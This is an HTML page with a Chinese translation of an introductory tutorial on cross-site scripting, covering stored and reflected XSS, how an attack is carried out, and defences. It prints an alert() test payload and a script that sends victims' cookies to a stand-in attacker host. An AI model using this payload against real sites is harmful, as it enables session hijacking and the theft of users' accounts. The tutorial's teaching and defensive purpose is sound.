<html>
<head>
<title>Introduction to Cross-Site Scripting (XSS)</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">跨站点脚本简介(XSS)</h1>
<blockquote>原文：<a href="https://medium.com/geekculture/introduction-to-cross-site-scripting-xss-e2c001ad9132?source=collection_archive---------6-----------------------#2021-08-13">https://medium.com/geekculture/introduction-to-cross-site-scripting-xss-e2c001ad9132?source=collection_archive---------6-----------------------#2021-08-13</a></blockquote><div><div class="ds gw gx gy gz ha"/><div class="hb hc hd he hf"><div class=""/><p id="1790" class="pw-post-body-paragraph if ig hi ih b ii ij ik il im in io ip iq ir is it iu iv iw ix iy iz ja jb jc hb bi translated">本文为试图学习跨站点脚本(或XSS)的人提供了一个很好的介绍。你不需要成为一个专家来跟随。然而，为了从本文中获得最大收益，您需要了解一些关于web如何工作的基础知识。</p><p id="3e79" class="pw-post-body-paragraph if ig hi ih b ii ij ik il im in io ip iq ir is it iu iv iw ix iy iz ja jb jc hb bi translated">我们将首先学习什么是跨站点脚本以及它的类型。然后，我们将探索进行XSS攻击的过程。最后，我们将列出一些好的做法，我们可以遵循，以防止它。</p><figure class="je jf jg jh fd ji er es paragraph-image"><div class="er es jd"><img src="../Images/eadb9d03c6b74fe0cad024843b03a8a0.png" data-original-src="https://miro.medium.com/v2/resize:fit:1040/format:webp/1*0gwTN6xgbZE0WWhGlMAJxA.jpeg"/></div></figure><p id="0f9f" class="pw-post-body-paragraph if ig hi ih b ii ij ik il im in io ip iq ir is it iu iv iw ix iy iz ja jb jc hb bi translated"><em class="jl">免责声明:请注意，本文中教授的信息不会用于合法和道德目的之外的任何目的。和我所有的其他文章一样，这里的目标是进一步扩展安全文化，并帮助防御和保护信息系统免受恶意行为者的攻击。</em></p><p id="b5f8" class="pw-post-body-paragraph if ig hi ih b ii ij ik il im in io ip iq ir is it iu iv iw ix iy iz ja jb jc hb bi translated">所以，话虽如此，我们开始吧！</p></div><div class="ab cl jm jn gp jo" role="separator"><span class="jp bw bk jq jr js"/><span class="jp bw bk jq jr js"/><span class="jp bw bk jq jr"/></div><div class="hb hc hd he hf"><h1 id="c6ae" class="jt ju hi bd jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq bi translated">什么是跨站点脚本(XSS)？</h1><p id="c19d" class="pw-post-body-paragraph if ig hi ih b ii kr ik il im ks io ip iq kt is it iu ku iw ix iy kv ja jb jc hb bi translated"><strong class="ih hj">跨站脚本</strong> ( <strong class="ih hj"> XSS </strong>)是一种影响web应用的漏洞。它允许攻击者向网站发送恶意代码。然后，相同的代码被发送给其他用户，在他们的浏览器上执行。</p><p id="2dc2" class="pw-post-body-paragraph if ig hi ih b ii ij ik il im in io ip iq ir is it iu iv iw ix iy iz ja jb jc hb bi translated">一旦成功，XSS攻击可以为攻击者提供来自其他用户浏览器的敏感信息。例如，攻击者可以检索用户cookies和会话令牌，然后利用它们来执行会话劫持。</p><p id="878b" class="pw-post-body-paragraph if ig hi ih b ii ij ik il im in io ip iq ir is it iu iv iw ix iy iz ja jb jc hb bi translated">这里有一个插图，可以帮助您更好地理解攻击的过程。</p><figure class="je jf jg jh fd ji er es paragraph-image"><div class="er es jd"><img src="../Images/2164827994c8a6a08a49e79e859c0e02.png" data-original-src="https://miro.medium.com/v2/resize:fit:1040/format:webp/0*QxkJMJ4e7FsSyNXz.jpg"/></div></figure><p id="2ae8" class="pw-post-body-paragraph if ig hi ih b ii ij ik il im in io ip iq ir is it iu iv iw ix iy iz ja jb jc hb bi translated">考虑到最终用户通常信任易受攻击的网站，如果攻击发生在他们身上，他们会毫无防备。</p></div><div class="ab cl jm jn gp jo" role="separator"><span class="jp bw bk jq jr js"/><span class="jp bw bk jq jr js"/><span class="jp bw bk jq jr"/></div><div class="hb hc hd he hf"><h1 id="e842" class="jt ju hi bd jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq bi translated">XSS类型</h1><p id="59ee" class="pw-post-body-paragraph if ig hi ih b ii kr ik il im ks io ip iq kt is it iu ku iw ix iy kv ja jb jc hb bi translated">跨站脚本攻击主要有两种:<strong class="ih hj">持久</strong>和<strong class="ih hj">反射</strong>。</p><h2 id="2a21" class="kw ju hi bd jv kx ky kz jz la lb lc kd iq ld le kh iu lf lg kl iy lh li kp lj bi translated">执着的XSS</h2><p id="fa89" class="pw-post-body-paragraph if ig hi ih b ii kr ik il im ks io ip iq kt is it iu ku iw ix iy kv ja jb jc hb bi translated">一种<strong class="ih hj">持续型</strong>(也叫<strong class="ih hj">储存型</strong> ) XSS攻击是两种类型中最危险的。当攻击者提供的恶意脚本存储在web应用程序的服务器端时，就会发生这种情况。然后，每当其他用户请求与之相关的内容时，该代码就会被发送给他们。</p><p id="fd65" class="pw-post-body-paragraph if ig hi ih b ii ij ik il im in io ip iq ir is it iu iv iw ix iy iz ja jb jc hb bi translated">例如，注释部分是一个可能出现持久XSS的地方。这是因为网站将评论存储在服务器端的数据库中，用户每次访问该部分时，网站都会检索并显示这些评论。</p><p id="fe2d" class="pw-post-body-paragraph if ig hi ih b ii ij ik il im in io ip iq ir is it iu iv iw ix iy iz ja jb jc hb bi translated">上图是XSS持续攻击的一个例子。</p><h2 id="0363" class="kw ju hi bd jv kx ky kz jz la lb lc kd iq ld le kh iu lf lg kl iy lh li kp lj bi translated">反映了XSS</h2><p id="bfb8" class="pw-post-body-paragraph if ig hi ih b ii kr ik il im ks io ip iq kt is it iu ku iw ix iy kv ja jb jc hb bi translated">一次<strong class="ih hj">反射</strong> XSS攻击是两种类型中最不危险的。在反射XSS场景中，恶意脚本被发送到web应用程序，然后呈现给提交请求的用户，并且只呈现给该用户。网站不在服务器端存储任何东西。</p><p id="91af" class="pw-post-body-paragraph if ig hi ih b ii ij ik il im in io ip iq ir is it iu iv iw ix iy iz ja jb jc hb bi translated">反射XSS攻击可能发生的一个很好的例子是搜索表单。因为只有在搜索表单中提供字符串的用户才能在响应中看到该字符串，所以攻击者无法执行持续的XSS攻击。他们所能做的最糟糕的事情就是发动一次反射式的XSS袭击。</p><p id="4763" class="pw-post-body-paragraph if ig hi ih b ii ij ik il im in io ip iq ir is it iu iv iw ix iy iz ja jb jc hb bi translated">这乍一看似乎并不危险，但是如果恶意行为者将它与网络钓鱼攻击结合起来，他们就可以利用它从其他用户那里检索敏感信息。</p></div><div class="ab cl jm jn gp jo" role="separator"><span class="jp bw bk jq jr js"/><span class="jp bw bk jq jr js"/><span class="jp bw bk jq jr"/></div><div class="hb hc hd he hf"><h1 id="ccb4" class="jt ju hi bd jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq bi translated">如何执行跨站点脚本攻击</h1><p id="35ab" class="pw-post-body-paragraph if ig hi ih b ii kr ik il im ks io ip iq kt is it iu ku iw ix iy kv ja jb jc hb bi translated">现在我们知道了什么是跨站点脚本攻击，让我们看看我们如何执行一个。</p><p id="5040" class="pw-post-body-paragraph if ig hi ih b ii ij ik il im in io ip iq ir is it iu iv iw ix iy iz ja jb jc hb bi translated">首先，我们需要确定我们的目标网站是否容易受到XSS的攻击。要做到这一点，我们需要考虑网站上用户可以提供输入的所有方面。</p><p id="64d1" class="pw-post-body-paragraph if ig hi ih b ii ij ik il im in io ip iq ir is it iu iv iw ix iy iz ja jb jc hb bi translated">对于每个点，我们可以运行一个概念验证有效负载，以确认我们是否存在XSS漏洞。大多数情况下，我们可以在脚本中使用“<em class="jl">alert()</em>”Javascript函数。</p><pre class="je jf jg jh fd lk ll lm ln aw lo bi"><span id="dcb1" class="kw ju hi ll b fi lp lq l lr ls">&lt;script&gt;alert(“XSS!”);&lt;/script&gt;</span></pre><p id="008c" class="pw-post-body-paragraph if ig hi ih b ii ij ik il im in io ip iq ir is it iu iv iw ix iy iz ja jb jc hb bi translated">如果该网站易受XSS攻击，则会弹出一条带有“<em class="jl"> XSS”的警告消息！</em>“消息。这就是我们需要确认目标脆弱性的所有证据。</p><p id="7666" class="pw-post-body-paragraph if ig hi ih b ii ij ik il im in io ip iq ir is it iu iv iw ix iy iz ja jb jc hb bi translated">您应该注意，大多数网站可能会检测并阻止上述有效载荷。这并不意味着这些网站不容易受到攻击，这只是意味着你需要混淆有效载荷，以逃避检测。</p><p id="c6bc" class="pw-post-body-paragraph if ig hi ih b ii ij ik il im in io ip iq ir is it iu iv iw ix iy iz ja jb jc hb bi translated">一旦我们确定了网站的漏洞，您就可以运行一个有效负载，将用户的cookie发送到您控制的网页。</p><pre class="je jf jg jh fd lk ll lm ln aw lo bi"><span id="dffe" class="kw ju hi ll b fi lp lq l lr ls">&lt;script&gt;<br/>document.write('&lt;img src="http://www.maliciouswebsite.com/?cookie='+document.cookie()+'" \&gt;');<br/>&lt;/script&gt;</span></pre><p id="fe71" class="pw-post-body-paragraph if ig hi ih b ii ij ik il im in io ip iq ir is it iu iv iw ix iy iz ja jb jc hb bi translated">上述有效负载将尝试从攻击者控制的网站加载图像。图像的链接包含目标用户的cookie值。所以，当它收到这个请求时，恶意网站会记录这个值。</p><p id="20f9" class="pw-post-body-paragraph if ig hi ih b ii ij ik il im in io ip iq ir is it iu iv iw ix iy iz ja jb jc hb bi translated">然后，攻击者可以检查日志来检索连接到该网站的所有用户的cookies。</p></div><div class="ab cl jm jn gp jo" role="separator"><span class="jp bw bk jq jr js"/><span class="jp bw bk jq jr js"/><span class="jp bw bk jq jr"/></div><div class="hb hc hd he hf"><h1 id="b39f" class="jt ju hi bd jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq bi translated">抵御XSS</h1><p id="15c1" class="pw-post-body-paragraph if ig hi ih b ii kr ik il im ks io ip iq kt is it iu ku iw ix iy kv ja jb jc hb bi translated">这里有一些好的做法，你应该遵循，以保护您的网站免受XSS攻击:</p><ul class=""><li id="42a0" class="lt lu hi ih b ii ij im in iq lv iu lw iy lx jc ly lz ma mb bi translated">web应用程序应该总是<strong class="ih hj">验证用户输入</strong>，也就是说，验证用户提供的每一个数据。这个过程包括确保所提供的输入是预期的格式。例如，如果您在输入字段中询问用户的年龄，那么您应该期望提供的数据是小于120的正整数。任何超出这个范围的值都不应该被接受。</li><li id="1c8c" class="lt lu hi ih b ii mc im md iq me iu mf iy mg jc ly lz ma mb bi translated">Web应用程序也可以使用<strong class="ih hj">编码</strong>来转义某些不应该由web浏览器处理的字符。例如，如果我们想将用户提供的输入嵌入到HTML元素中，我们需要对它进行HTML编码。也就是说，我们需要将HTML保留字符转换成HTML实体(例如，'&lt;'将被转换成'&amp;lt；').同样，如果我们想将用户提供的输入嵌入到Javascript数据值中，我们需要对它进行Javascript编码。</li><li id="458d" class="lt lu hi ih b ii mc im md iq me iu mf iy mg jc ly lz ma mb bi translated">HTTP头也可以提供一个很好的防御XSS的层。在响应头中使用“<em class="jl">内容类型</em>和“<em class="jl"> X内容类型选项</em>”可以限制网页上脚本的执行。</li></ul></div><div class="ab cl jm jn gp jo" role="separator"><span class="jp bw bk jq jr js"/><span class="jp bw bk jq jr js"/><span class="jp bw bk jq jr"/></div><div class="hb hc hd he hf"><p id="c0e3" class="pw-post-body-paragraph if ig hi ih b ii ij ik il im in io ip iq ir is it iu iv iw ix iy iz ja jb jc hb bi translated">我们已经在这篇文章中介绍了要点。现在，您应该对跨站点脚本有了基本的了解。</p><p id="9648" class="pw-post-body-paragraph if ig hi ih b ii ij ik il im in io ip iq ir is it iu iv iw ix iy iz ja jb jc hb bi translated">然而，XSS还有比我们在这里所介绍的更多的东西。所以你不应该满足。至少现在还没有。我邀请你在我们这里讨论的基础上，从网络上的其他资源中学习。例如，<a class="ae mh" href="https://owasp.org/www-community/attacks/xss/" rel="noopener ugc nofollow" target="_blank"> OWASP </a>和<a class="ae mh" href="https://portswigger.net/web-security/cross-site-scripting" rel="noopener ugc nofollow" target="_blank"> PortSwigger </a>网站为这个主题提供了很好的参考。</p></div><div class="ab cl jm jn gp jo" role="separator"><span class="jp bw bk jq jr js"/><span class="jp bw bk jq jr js"/><span class="jp bw bk jq jr"/></div><div class="hb hc hd he hf"><p id="b674" class="pw-post-body-paragraph if ig hi ih b ii ij ik il im in io ip iq ir is it iu iv iw ix iy iz ja jb jc hb bi translated"><em class="jl">原载于2021年8月13日https://patchthenet.com</em><a class="ae mh" href="https://patchthenet.com/articles/introduction-to-cross-site-scripting-xss/" rel="noopener ugc nofollow" target="_blank"><em class="jl"/></a><em class="jl">。</em></p></div></div>    
</body>
</html>